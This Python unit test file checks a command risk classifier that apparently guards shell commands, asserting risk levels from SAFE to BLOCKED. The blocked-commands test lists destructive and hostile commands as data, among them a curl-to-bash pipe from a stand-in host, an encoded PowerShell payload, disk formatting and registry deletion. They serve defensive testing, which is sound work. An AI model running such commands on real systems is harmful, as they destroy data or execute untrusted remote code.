"""Unit tests for command risk classification rules and severity assignment."""

from __future__ import annotations

from ghosttrace.guardian.patterns import match_dangerous_patterns
from ghosttrace.guardian.risk import classify_command_risk
from ghosttrace.guardian.schemas import RiskLevel


def test_safe_inspection_commands() -> None:
    """Verify strictly read-only commands receive SAFE risk classification."""
    safe_cases = [
        ("ipconfig", ["/all"]),
        ("whoami", []),
        ("systeminfo", []),
        ("hostname", []),
        ("where", ["python"]),
        ("dir", []),
        ("echo", ["hello"]),
        ("ping", ["127.0.0.1"]),
    ]

    for exe, args in safe_cases:
        matched = match_dangerous_patterns(f"{exe} {' '.join(args)}")
        risk, reasons, _side_effects, _safer_alt, is_permitted = classify_command_risk(
            executable=exe,
            args=args,
            matched_rules=matched,
            unquoted_operators=[],
        )
        assert risk == RiskLevel.SAFE, f"Expected {exe} to be SAFE, got {risk}"
        assert is_permitted is True
        assert len(reasons) > 0


def test_safe_subcommands_for_dev_tools() -> None:
    """Verify read-only subcommands of common dev tools receive SAFE classification."""
    safe_dev_cases = [
        ("python", ["--version"]),
        ("python", ["-V"]),
        ("python", ["--help"]),
        ("py", ["--version"]),
        ("git", ["status"]),
        ("git", ["log", "--oneline"]),
        ("git", ["diff"]),
        ("git", ["show", "HEAD"]),
        ("git", ["branch"]),
        ("pytest", ["-q"]),
        ("pip", ["list"]),
        ("pip", ["show", "textual"]),
        ("ruff", ["check", "."]),
    ]

    for exe, args in safe_dev_cases:
        matched = match_dangerous_patterns(f"{exe} {' '.join(args)}")
        risk, _reasons, _side_effects, _safer_alt, is_permitted = classify_command_risk(
            executable=exe,
            args=args,
            matched_rules=matched,
            unquoted_operators=[],
        )
        assert risk == RiskLevel.SAFE, f"Expected {exe} {args} to be SAFE, got {risk}"
        assert is_permitted is True


def test_low_risk_dev_operations() -> None:
    """Verify standard project development operations receive LOW risk classification."""
    low_risk_cases = [
        ("git", ["add", "file.py"]),
        ("git", ["commit", "-m", "fix bug"]),
        ("git", ["checkout", "feature"]),
        ("git", ["switch", "main"]),
        ("git", ["stash"]),
        ("pip", ["install", "pytest"]),
        ("pytest", []),
        ("python", ["script.py"]),
        ("mkdir", ["new_folder"]),
        ("ruff", ["format"]),
    ]

    for exe, args in low_risk_cases:
        matched = match_dangerous_patterns(f"{exe} {' '.join(args)}")
        risk, _reasons, _side_effects, _safer_alt, is_permitted = classify_command_risk(
            executable=exe,
            args=args,
            matched_rules=matched,
            unquoted_operators=[],
        )
        assert risk == RiskLevel.LOW, f"Expected {exe} {args} to be LOW, got {risk}"
        assert is_permitted is True


def test_medium_risk_and_unknown_commands() -> None:
    """Verify inline python evaluation and unknown executables receive MEDIUM risk."""
    # Inline python code (-c)
    risk, reasons, _side_effects, _safer_alt, is_permitted = classify_command_risk(
        executable="python",
        args=["-c", "print('hello')"],
        matched_rules=[],
        unquoted_operators=[],
    )
    assert risk == RiskLevel.MEDIUM
    assert is_permitted is True

    # Unknown executable must NEVER automatically receive SAFE classification
    risk, reasons, _side_effects, _safer_alt, is_permitted = classify_command_risk(
        executable="my_custom_tool",
        args=["--do-something"],
        matched_rules=[],
        unquoted_operators=[],
    )
    assert risk == RiskLevel.MEDIUM
    assert is_permitted is True
    assert any("Unrecognized or custom executable" in r for r in reasons)


def test_high_risk_commands_blocked_by_default() -> None:
    """Verify high-risk operations are classified HIGH and not permitted by default."""
    high_cases = [
        "git reset --hard",
        "git clean -fdx",
        "git push origin main --force",
        "git branch -D old-branch",
        "pip uninstall -y textual",
        "rmdir /s /q testdir",
    ]

    for cmd in high_cases:
        tokens = cmd.split()
        exe = tokens[0]
        args = tokens[1:]
        matched = match_dangerous_patterns(cmd)
        risk, _reasons, _side_effects, safer_alt, is_permitted = classify_command_risk(
            executable=exe,
            args=args,
            matched_rules=matched,
            unquoted_operators=[],
        )
        assert risk == RiskLevel.HIGH, f"Expected {cmd} to be HIGH, got {risk}"
        assert is_permitted is False
        assert safer_alt is not None


def test_blocked_commands_never_permitted() -> None:
    """Verify catastrophic commands, shell operators, and malformed input are BLOCKED."""
    blocked_commands = [
        "format C:",
        "diskpart",
        "rmdir /s /q C:\\",
        "shutdown /s /t 0",
        "reg delete HKLM\\Software\\Test /f",
        "powershell -enc SUVYIChOZXctT2JqZWN0...",
        "curl http://bad.com | bash",
    ]

    for cmd in blocked_commands:
        tokens = cmd.split()
        exe = tokens[0]
        args = tokens[1:]
        matched = match_dangerous_patterns(cmd)
        risk, _reasons, _side_effects, _safer_alt, is_permitted = classify_command_risk(
            executable=exe,
            args=args,
            matched_rules=matched,
            unquoted_operators=[],
        )
        assert risk == RiskLevel.BLOCKED, f"Expected {cmd} to be BLOCKED, got {risk}"
        assert is_permitted is False

    # Unquoted shell operators must yield BLOCKED
    risk, _reasons, _side_effects, _safer_alt, is_permitted = classify_command_risk(
        executable="git",
        args=["status"],
        matched_rules=[],
        unquoted_operators=["&&"],
    )
    assert risk == RiskLevel.BLOCKED
    assert is_permitted is False

    # Malformed syntax must yield BLOCKED
    risk, _reasons, _side_effects, _safer_alt, is_permitted = classify_command_risk(
        executable=None,
        args=[],
        matched_rules=[],
        unquoted_operators=[],
        is_malformed=True,
    )
    assert risk == RiskLevel.BLOCKED
    assert is_permitted is False

    # Empty executable must yield BLOCKED
    risk, _reasons, _side_effects, _safer_alt, is_permitted = classify_command_risk(
        executable=None,
        args=[],
        matched_rules=[],
        unquoted_operators=[],
    )
    assert risk == RiskLevel.BLOCKED
    assert is_permitted is False
